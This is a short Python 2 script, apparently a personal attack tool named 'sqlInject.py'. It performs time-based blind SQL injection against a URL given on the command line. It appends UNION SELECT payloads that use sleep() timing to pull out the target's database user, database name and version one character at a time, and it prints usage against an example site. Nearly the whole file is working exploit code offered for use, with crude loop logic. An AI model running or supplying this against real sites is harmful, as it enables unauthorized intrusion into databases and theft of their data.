# -*- coding: utf-8 -*-
# @Author: lock
# @Date:   2017-02-12 21:32:31
# @Last Modified by:   lock
# @Last Modified time: 2017-02-12 21:32:42
import sys
import string
import time,datetime
import requests

def main(url):
    print('Loding...')
    print('Start Attack ....')
    # payload = list(string.ascii_letters)
    payload = list(string.ascii_lowercase)
    payload += ['_', '.','@',',','-']
    payload += [str(num) for num in range(0,10)]
    maxLength = 30
    exploit = []
    for i in xrange(maxLength):
        for element in payload:
            t1 = time.time()
            poc = url+" union select if((ord(SUBSTR(concat_ws(' ---- ',user(),database(),version()),"+str(i+1)+",1))=ord('"+element+"'))=1,sleep(0),sleep(0.5)),2,3"
            response = requests.get(poc)
            if response.status_code==200:
                t2 = time.time()
                if t2-t1<0.5:
                    exploit.append(element)
                    print(''.join(exploit)+'...')
                    continue
    print('Finish...')
def help():
    print('-----Usage:-----\n')
    print('Example:\npython sqlInject.py -u http://xxx.xxx.com/id=123')


if __name__ == '__main__':
    args = sys.argv
    if len(args) == 3:
        if args[1] == '-u':
            main(args[2])
        else:
            help()
    else:
        help()
